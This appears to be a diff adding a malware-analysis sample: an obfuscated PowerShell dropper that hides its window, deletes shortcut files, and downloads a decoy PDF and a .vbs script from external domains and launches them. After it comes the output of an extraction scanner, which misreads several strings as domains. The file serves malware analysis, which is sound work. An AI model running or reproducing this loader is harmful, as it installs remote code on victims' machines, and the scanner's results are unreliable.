@@ -1,0 +1,42 @@
+powershell -win hidden $g72p14=iex($('[Environment]::GetExihs'''.Replace('xih','nvironmentVariable(''public'') + ''\\p9nc2a.vb')));$flol=iex($('[Environment]::GetExihs'''.Replace('xih','nvironmentVariable(''public'') + ''\\yd2.vb')));function getit([string]$fz, [string]$oulv){$ff=iex($('(Nh5fw-Objh5fct Systh5fm.Nh5ft.Wh5fbClih5fnt).Downh9he($oulv.Replace(''j5f'',''tps://'').Replace(''r4j'', ''e''), $fz)').Replace('h5f', 'e').Replace('h9h', 'loadFil'));iex('szvbarzvb $fz'.Replace('zvb','t'))};$fzf=$(Get-Location).tostring() + '\\';Remove-Item -Path ($fzf + $(Get-ChildItem -Include *.lnk -Name));getit -fz ($fzf + 'List of Required items and services.pdf') -oulv 'htj5fwww.kuthbanr4jng.com/wh/List%20of%20rr4jquirr4jd%20itr4jms%20and%20sr4jrvicr4js.pdf';getit -fz $flol -oulv 'htj5fwww.pinr4japplr4jtr4jch.ar4j/at/at.vbs';exit[*] Scanning file: ./samples/sample1.ps1
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about FileSystem in ./samples/sample1.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                         Remove-Item                          │
+│                          Move-Item                           │
+└──────────────────────────────────────────────────────────────┘
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about Networking in ./samples/sample1.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                             IEX                              │
+└──────────────────────────────────────────────────────────────┘
+[!] No URLs found in ./samples/sample1.ps1.
+
+
+[*] Extracting Domains from ./samples/sample1.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted Domains from ./samples/sample1.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│              20sr4jrvicr4js.pdf              │
+│          htj5fwww.kuthbanr4jng.com           │
+│                    yd2.vb                    │
+│                    at.vbs                    │
+│                 oulv.Replace                 │
+│                  p9nc2a.vb                   │
+│                 services.pdf                 │
+└──────────────────────────────────────────────┘
+[!] No File Paths found in ./samples/sample1.ps1.
+
+[!] No IP Addresses found in ./samples/sample1.ps1.
+
+
+[*] Extracting Files from ./samples/sample1.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃         Extracted Files from ./samples/sample1.ps1          ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│ List%20of%20rr4jquirr4jd%20itr4jms%20and%20sr4jrvicr4js.pdf │
+│                           yd2.vb                            │
+│                           at.vbs                            │
+│                          p9nc2a.vb                          │
+│                        services.pdf                         │
+└─────────────────────────────────────────────────────────────┘
